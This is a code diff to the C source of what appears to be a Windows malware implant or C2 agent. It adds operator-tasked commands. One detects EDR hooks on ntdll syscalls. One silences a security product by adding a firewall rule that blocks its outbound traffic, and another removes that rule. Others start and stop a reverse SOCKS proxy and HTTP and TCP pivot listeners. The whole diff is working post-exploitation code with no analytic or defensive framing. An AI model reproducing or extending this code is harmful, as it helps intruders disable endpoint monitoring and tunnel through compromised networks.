@@ -4,6 +4,9 @@
 #include "config.h"
 #include "evasion.h"
 #include "b64.h"
+#include "rsocks.h"
+#include "http_pivot.h"
+#include "tcp_pivot.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -2330,6 +2333,126 @@ void dispatch_task(AgentTask *task) {
         free(raw);
         strcat(json, "]}");
         agent_send_result(task->id, json, "");
+    }
+    else if (strcmp(type_upper, "HOOK_CHECK") == 0) {
+        static const struct { const char *dll; const char *fn; } hk_fns[] = {
+            {"ntdll.dll","NtOpenProcess"},{"ntdll.dll","NtAllocateVirtualMemory"},
+            {"ntdll.dll","NtWriteVirtualMemory"},{"ntdll.dll","NtCreateThreadEx"},
+            {"ntdll.dll","NtProtectVirtualMemory"},{"ntdll.dll","NtReadVirtualMemory"},
+            {"ntdll.dll","NtQueueApcThread"},{"ntdll.dll","NtCreateSection"},
+            {"ntdll.dll","NtMapViewOfSection"},{"ntdll.dll","NtUnmapViewOfSection"},
+            {"ntdll.dll","NtSuspendThread"},{"ntdll.dll","NtResumeThread"},
+            {"ntdll.dll","NtGetContextThread"},{"ntdll.dll","NtSetContextThread"},
+            {NULL,NULL}
+        };
+        char sb[4096] = "[HOOK_CHECK]\n";
+        for (int i = 0; hk_fns[i].dll; i++) {
+            HMODULE hm = GetModuleHandleA(hk_fns[i].dll);
+            if (!hm) { char tmp[128]; snprintf(tmp,sizeof(tmp),"  MISS  %s!%s (not loaded)\n",hk_fns[i].dll,hk_fns[i].fn); strncat(sb,tmp,sizeof(sb)-strlen(sb)-1); continue; }
+            FARPROC fn = GetProcAddress(hm, hk_fns[i].fn);
+            if (!fn) { char tmp[128]; snprintf(tmp,sizeof(tmp),"  MISS  %s!%s (not found)\n",hk_fns[i].dll,hk_fns[i].fn); strncat(sb,tmp,sizeof(sb)-strlen(sb)-1); continue; }
+            unsigned char b = *(unsigned char*)fn;
+            const char *status = (b==0xE9)?"HOOKED (JMP)":(b==0xE8)?"HOOKED (CALL)":(b==0xCC)?"HOOKED (INT3)":"clean";
+            char tmp[128]; snprintf(tmp,sizeof(tmp),"  %c     %s!%s -> %s (0x%02X)\n",(b==0xE9||b==0xE8||b==0xCC)?'!':' ',hk_fns[i].dll,hk_fns[i].fn,status,(unsigned)b);
+            strncat(sb,tmp,sizeof(sb)-strlen(sb)-1);
+        }
+        agent_send_result(task->id, sb, "");
+    }
+    else if (strcmp(type_upper, "EDR_SILENCE") == 0) {
+        long long pid = 0;
+        {
+            const char *p = strstr(task->args, "\"pid\"");
+            if (p) { p = strchr(p, ':'); if (p) pid = atoll(p+1); }
+        }
+        if (pid <= 0) {
+            agent_send_result(task->id, "", "EDR_SILENCE requires {\"pid\":N}");
+        } else {
+            char ps_cmd[256];
+            snprintf(ps_cmd, sizeof(ps_cmd),
+                "powershell -NoProfile -NonInteractive -Command \"(Get-Process -Id %lld).Path\"", pid);
+            char *proc_path = run_shell(ps_cmd);
+            char path_clean[1024] = {0};
+            if (proc_path) {
+                char *p2 = proc_path;
+                while (*p2 == '\r' || *p2 == '\n' || *p2 == ' ') p2++;
+                size_t l = strlen(p2);
+                while (l > 0 && (p2[l-1]=='\r'||p2[l-1]=='\n'||p2[l-1]==' ')) p2[--l]='\0';
+                strncpy(path_clean, p2, sizeof(path_clean)-1);
+                free(proc_path);
+            }
+            if (!path_clean[0]) {
+                agent_send_result(task->id, "", "EDR_SILENCE: could not resolve process path");
+            } else {
+                char rule[64]; snprintf(rule, sizeof(rule), "EDRSilence_%lld", pid);
+                char netsh[1024];
+                snprintf(netsh, sizeof(netsh),
+                    "netsh advfirewall firewall add rule name=\"%s\" dir=out action=block program=\"%s\" enable=yes",
+                    rule, path_clean);
+                char *out3 = run_shell(netsh);
+                char res[2048]; snprintf(res, sizeof(res), "[+] EDR_SILENCE pid=%lld path=%s\n%s", pid, path_clean, out3 ? out3 : "");
+                if (out3) free(out3);
+                agent_send_result(task->id, res, "");
+            }
+        }
+    }
+    else if (strcmp(type_upper, "EDR_SILENCE_RM") == 0) {
+        long long pid = 0;
+        {
+            const char *p = strstr(task->args, "\"pid\"");
+            if (p) { p = strchr(p, ':'); if (p) pid = atoll(p+1); }
+        }
+        if (pid <= 0) {
+            agent_send_result(task->id, "", "EDR_SILENCE_RM requires {\"pid\":N}");
+        } else {
+            char rule[64]; snprintf(rule, sizeof(rule), "EDRSilence_%lld", pid);
+            char netsh[256];
+            snprintf(netsh, sizeof(netsh), "netsh advfirewall firewall delete rule name=\"%s\"", rule);
+            char *out4 = run_shell(netsh);
+            char res2[512]; snprintf(res2, sizeof(res2), "[+] rule removed: %s\n%s", rule, out4 ? out4 : "");
+            if (out4) free(out4);
+            agent_send_result(task->id, res2, "");
+        }
+    }
+    else if (strcmp(type_upper, "RSOCKS_START") == 0) {
+        char *out5 = rsocks_start(task->args[0] ? task->args : "0");
+        agent_send_result(task->id, out5 ? out5 : "[-] rsocks_start failed", "");
+        if (out5) free(out5);
+    }
+    else if (strcmp(type_upper, "RSOCKS_STOP") == 0) {
+        rsocks_stop();
+        agent_send_result(task->id, "[+] rsocks stopped", "");
+    }
+    else if (strcmp(type_upper, "HTTP_PIVOT_START") == 0) {
+        int port6 = 0;
+        const char *parg = strstr(task->args, "\"port\"");
+        if (parg) { parg = strchr(parg, ':'); if (parg) port6 = atoi(parg+1); }
+        if (port6 <= 0) {
+            agent_send_result(task->id, "", "HTTP_PIVOT_START requires {\"port\":N}");
+        } else {
+            char *out6 = http_pivot_start(port6, g_agent.agent_id);
+            agent_send_result(task->id, out6 ? out6 : "[-] http_pivot_start failed", "");
+            if (out6) free(out6);
+        }
+    }
+    else if (strcmp(type_upper, "HTTP_PIVOT_STOP") == 0) {
+        http_pivot_stop();
+        agent_send_result(task->id, "[+] HTTP pivot stopped", "");
+    }
+    else if (strcmp(type_upper, "TCP_PIVOT_START") == 0) {
+        int port7 = 0;
+        const char *parg2 = strstr(task->args, "\"port\"");
+        if (parg2) { parg2 = strchr(parg2, ':'); if (parg2) port7 = atoi(parg2+1); }
+        if (port7 <= 0) {
+            agent_send_result(task->id, "", "TCP_PIVOT_START requires {\"port\":N}");
+        } else {
+            char *out7 = tcp_pivot_start(port7, g_agent.agent_id);
+            agent_send_result(task->id, out7 ? out7 : "[-] tcp_pivot_start failed", "");
+            if (out7) free(out7);
+        }
+    }
+    else if (strcmp(type_upper, "TCP_PIVOT_STOP") == 0) {
+        tcp_pivot_stop();
+        agent_send_result(task->id, "[+] TCP pivot stopped", "");
     }
     else {
         char err[128];
